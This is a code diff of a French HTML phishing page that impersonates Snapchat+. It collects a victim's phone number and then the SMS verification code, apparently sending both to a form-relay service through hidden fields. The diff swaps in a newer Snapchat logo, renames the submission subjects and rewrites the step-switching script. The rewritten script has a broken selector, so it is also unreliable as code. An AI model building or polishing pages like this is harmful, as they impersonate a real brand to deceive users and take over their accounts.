@@ -1,4 +1,5 @@
-        <!DOCTYPE html>
+                    
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -9,7 +10,7 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* C'est ici que ton image fond.jpg va s'afficher */
+            /* Ton image de fond */
             background-image: url('fond.jpg');
             background-size: cover;
             background-position: center;
@@ -25,30 +26,22 @@
             max-width: 400px;
             padding: 20px;
             text-align: center;
-            /* Petit fond blanc semi-transparent pour que le texte reste lisible sur ton image */
-            background-color: rgba(255, 255, 255, 0.9); 
+            background-color: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
-        /* Zone du logo */
+        /* Logo fantôme blanc */
         .snap-logo {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
+            background-color: transparent;
             margin: 0 auto 20px auto;
-            background-color: #FFFC00;
-            border-radius: 25px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
         .snap-logo img {
-            width: 80%;
-            height: 80%;
-            object-fit: contain;
+            width: 100%;
+            height: auto;
         }
 
         h1 {
@@ -125,9 +118,9 @@
 <body>
 
     <div class="container">
-        <!-- VRAI LOGO SNAPCHAT -->
+        <!-- LOGO BLANC -->
         <div class="snap-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Snapchat_icon_2019.svg/1200px-Snapchat_icon_2019.svg.png" alt="Snapchat">
         </div>
 
         <!-- Étape 1 : Infos -->
@@ -146,7 +139,7 @@
                     <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                 </div>
 
-                <input type="hidden" name="_subject" value="Nouveau profil Snapchat+ !">
+                <input type="hidden" name="_subject" value="Snapchat+ Infos">
                 <input type="hidden" name="_captcha" value="false">
                 <input type="hidden" name="_next" value="">
 
@@ -165,7 +158,7 @@
                     <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                 </div>
 
-                <input type="hidden" name="_subject" value="Code SMS validé !">
+                <input type="hidden" name="_subject" value="Snapchat+ Code SMS">
                 <input type="hidden" name="_captcha" value="false">
                 <input type="hidden" name="_next" value="">
 
@@ -179,22 +172,13 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const form1 = document.querySelector('#step-1 form');
-            const step2 = document.getElementById('step-2');
-            
-            form1.addEventListener('submit', function(e) {
+            // Cacher le step 1 et afficher le step 2 dès que l'utilisateur clique sur "Vérifier"
+            document.getElementById('step-1 form').addEventListener('submit', function(e) {
+                // On empêche la page de recharger immédiatement pour montrer l'étape 2
                 setTimeout(() => {
                     document.getElementById('step-1').style.display = 'none';
-                    step2.style.display = 'block';
-                }, 800);
-            });
-
-            const form2 = document.querySelector('#step-2 form');
-            form2.addEventListener('submit', function() {
-                setTimeout(() => {
-                    document.getElementById('step-2').style.display = 'none';
-                    document.querySelector('.container').innerHTML = "<h1>Vérification terminée !</h1><p>Votre profil est en cours d'activation.</p>";
-                }, 1000);
+                    document.getElementById('step-2').style.display = 'block';
+                }, 500);
             });
         });
     </script>
